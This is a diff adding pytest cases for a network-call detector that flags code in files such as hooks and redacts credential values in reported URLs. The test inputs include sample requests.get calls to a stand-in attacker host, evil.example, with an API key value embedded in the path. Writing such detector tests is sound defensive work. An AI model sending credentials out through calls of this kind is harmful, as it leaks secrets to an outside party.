@@ -1396,6 +1396,38 @@ class TestNetworkCommDetector:
         assert f"https://evil.example/{path}/model.bin" in json.dumps(findings, sort_keys=True)
 
     @pytest.mark.parametrize(
+        "key_segment",
+        [
+            "prefix:api_key",
+            "prefix;api_key",
+            "prefix&api_key",
+            "prefix&amp;api_key",
+            "prefix,api_key",
+            "prefix%2Fapi_key",
+            "prefix%252Fapi_key",
+        ],
+    )
+    def test_compound_sensitive_path_key_redacts_value_in_next_segment(self, key_segment: str) -> None:
+        """A compound segment ending in a credential key must taint the following path value."""
+        secret = "SECRET123"
+        findings = NetworkCommDetector().scan(
+            f'requests.get("https://evil.example/{key_segment}/{secret}/model.bin")'.encode(),
+            "hook.py",
+        )
+
+        serialized = json.dumps(findings, sort_keys=True)
+        assert secret not in serialized
+        assert f"https://evil.example/{key_segment}/<redacted>/model.bin" in serialized
+
+    def test_compound_path_key_near_match_preserves_value_in_next_segment(self) -> None:
+        """A non-sensitive compound suffix must not hide ordinary path data."""
+        url = "https://evil.example/prefix:api_key_hint/public/model.bin"
+
+        findings = NetworkCommDetector().scan(url.encode(), "hook.py")
+
+        assert url in json.dumps(findings, sort_keys=True)
+
+    @pytest.mark.parametrize(
         "path",
         [
             "prefix%2Fapi_key=SECRET123/model.bin",
